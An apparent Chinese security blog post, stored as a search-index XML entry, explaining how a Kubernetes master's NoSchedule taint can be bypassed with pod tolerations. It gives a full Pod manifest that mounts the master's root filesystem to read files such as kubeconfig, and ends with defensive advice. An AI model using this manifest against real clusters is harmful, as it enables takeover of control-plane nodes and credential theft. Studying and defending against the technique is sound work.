<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master</title>
      <link href="/2025/04/01/k8s-taint-toleration-scheduler-escape/"/>
      <url>/2025/04/01/k8s-taint-toleration-scheduler-escape/</url>
      
        <content type="html"><![CDATA[<p>K8s 集群默认给 Master 节点打了 <code>NoSchedule</code> 污点，普通 Pod 不会调度上去。但如果拿到了一个带 <code>Create</code> 权限的凭据，可以通过<strong>污点容忍</strong>把 Pod 强行调度到 Master，再挂载宿主机根目录完成逃逸。本文整理一下这条攻击路径的完整链条。</p><h2 id="1-背景：污点与容忍"><a href="#1-背景：污点与容忍" class="headerlink" title="1. 背景：污点与容忍"></a>1. 背景：污点与容忍</h2><p><strong>污点 (Taints)</strong> —— 打在节点上，阻止 Pod 调度。</p><p><strong>容忍 (Tolerations)</strong> —— 打在 Pod 上，”我不怕这个污点”，强行往上调度。</p><h3 id="1-1-污点的三种效果"><a href="#1-1-污点的三种效果" class="headerlink" title="1.1 污点的三种效果"></a>1.1 污点的三种效果</h3><table><thead><tr><th>效果</th><th>含义</th></tr></thead><tbody><tr><td><code>NoSchedule</code></td><td>Pod 不会被调度到该节点</td></tr><tr><td><code>PreferNoSchedule</code></td><td>尽量不调度到该节点（软限制）</td></tr><tr><td><code>NoExecute</code></td><td>不调度，且驱逐节点上已有 Pod</td></tr></tbody></table><p>查看节点污点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node &lt;nodename&gt;</span><br></pre></td></tr></table></figure><h3 id="1-2-为什么-Master-需要污点"><a href="#1-2-为什么-Master-需要污点" class="headerlink" title="1.2 为什么 Master 需要污点"></a>1.2 为什么 Master 需要污点</h3><p>Master 节点运行着 <code>kube-apiserver</code> 等控制面组件，是整个集群的核心。默认情况下 Master 会被标记污点，避免业务 Pod 抢占资源或造成安全风险。</p><h3 id="1-3-容忍的匹配规则"><a href="#1-3-容忍的匹配规则" class="headerlink" title="1.3 容忍的匹配规则"></a>1.3 容忍的匹配规则</h3><p>容忍度定义在 Pod 的 <code>spec.tolerations</code> 中，支持两种匹配方式：</p><ul><li><strong>Equal</strong> — <code>key</code>、<code>value</code>、<code>effect</code> 三者完全匹配</li><li><strong>Exists</strong> — <code>key</code> 和 <code>effect</code> 匹配即可，<code>value</code> 留空</li></ul><h2 id="2-调度器是如何工作的"><a href="#2-调度器是如何工作的" class="headerlink" title="2. 调度器是如何工作的"></a>2. 调度器是如何工作的</h2><p><code>kube-scheduler</code> 是 Master 上的默认调度器，它的工作流程：</p><ol><li>API Server 收到创建 Pod 请求，数据写入 etcd</li><li>Scheduler 通过 list-watch 监听到新 Pod</li><li>经过调度算法（过滤 + 打分）选出最优 Node</li><li>结果写回 etcd，对应节点的 kubelet 负责创建容器</li></ol><p><img src="/images/k8s-taint/1818641-20250401114215942-1818140185.png"></p><h3 id="2-1-影响调度的主要因素"><a href="#2-1-影响调度的主要因素" class="headerlink" title="2.1 影响调度的主要因素"></a>2.1 影响调度的主要因素</h3><p><strong>资源限制</strong>：调度器检查每个节点的 CPU &#x2F; Memory 是否满足 Pod 需求。</p><p><strong>nodeSelector</strong>：最简单的方式，Pod 只调度到带有指定 label 的节点。</p><p><strong>nodeAffinity</strong>：<code>nodeSelector</code> 的升级版，支持逻辑组合，更灵活。</p><h2 id="3-攻击：从-Worker-横向到-Master"><a href="#3-攻击：从-Worker-横向到-Master" class="headerlink" title="3. 攻击：从 Worker 横向到 Master"></a>3. 攻击：从 Worker 横向到 Master</h2><h3 id="3-1-思路"><a href="#3-1-思路" class="headerlink" title="3.1 思路"></a>3.1 思路</h3><ol><li>拿到一个具有 Pod Create 权限的凭据（通常通过创建特权容器逃逸到某台 Worker 节点）</li><li>默认 Pod 不允许调度到 Master（因为 <code>NoSchedule</code> 污点）</li><li>在 Pod 定义中添加 <code>tolerations</code>，匹配 Master 的污点标签</li><li>Pod 被调度到 Master 后，挂载宿主机根目录，完成逃逸</li></ol><h3 id="3-2-Master-的默认污点"><a href="#3-2-Master-的默认污点" class="headerlink" title="3.2 Master 的默认污点"></a>3.2 Master 的默认污点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node master-node</span><br><span class="line"><span class="comment"># Taints: node-role.kubernetes.io/master:NoSchedule</span></span><br></pre></td></tr></table></figure><p><img src="/images/k8s-taint/1818641-20250401114242342-1939908142.png"></p><h3 id="3-3-构造带容忍度的-Pod"><a href="#3-3-构造带容忍度的-Pod" class="headerlink" title="3.3 构造带容忍度的 Pod"></a>3.3 构造带容忍度的 Pod</h3><p>关键就在 <code>spec.tolerations</code> 这段——声明”我能容忍 <code>node-role.kubernetes.io/master</code> 的 <code>NoSchedule</code> 污点”：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">masterpwn1</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">cloud-prod</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">tolerations:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&quot;node-role.kubernetes.io/master&quot;</span></span><br><span class="line">    <span class="attr">operator:</span> <span class="string">&quot;Exists&quot;</span></span><br><span class="line">    <span class="attr">effect:</span> <span class="string">&quot;NoSchedule&quot;</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">pwnmaster-vol</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">pwnmaster-vol</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line">  <span class="attr">serviceAccountName:</span> <span class="string">cloud-account</span></span><br></pre></td></tr></table></figure><h3 id="3-4-效果"><a href="#3-4-效果" class="headerlink" title="3.4 效果"></a>3.4 效果</h3><p>部署后 Pod 成功落在 Master 节点：</p><p><img src="/images/k8s-taint/1818641-20250401114256903-1174883148.png"></p><p>由于挂载了 Master 宿主机根目录 <code>/</code> 到容器内的 <code>/mnt</code>，可以任意读写 Master 节点的文件系统：</p><p><img src="/images/k8s-taint/1818641-20250401114310017-298119589.png"></p><p>直接读取 kubeconfig 配置文件：</p><p><img src="/images/k8s-taint/1818641-20250401114322656-206406249.png"></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>这条链路的核心就两点：</p><ul><li>Master 节点的 <code>NoSchedule</code> 污点可以通过 Pod 的 <code>tolerations</code> 绕过</li><li>一旦 Pod 落在 Master，配合 <code>hostPath</code> 挂载根目录就能拿到 Master 的控制权</li></ul><p>防御侧可以考虑：限制 <code>tolerations</code> 的使用（准入控制器）、禁止挂载宿主机敏感路径、限制 Pod 的 <code>serviceAccount</code> 权限。</p>]]></content>
      
      
      <categories>
          
          <category> Cloud Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 容器安全 </tag>
            
            <tag> 横向移动 </tag>
            
            <tag> 特权逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
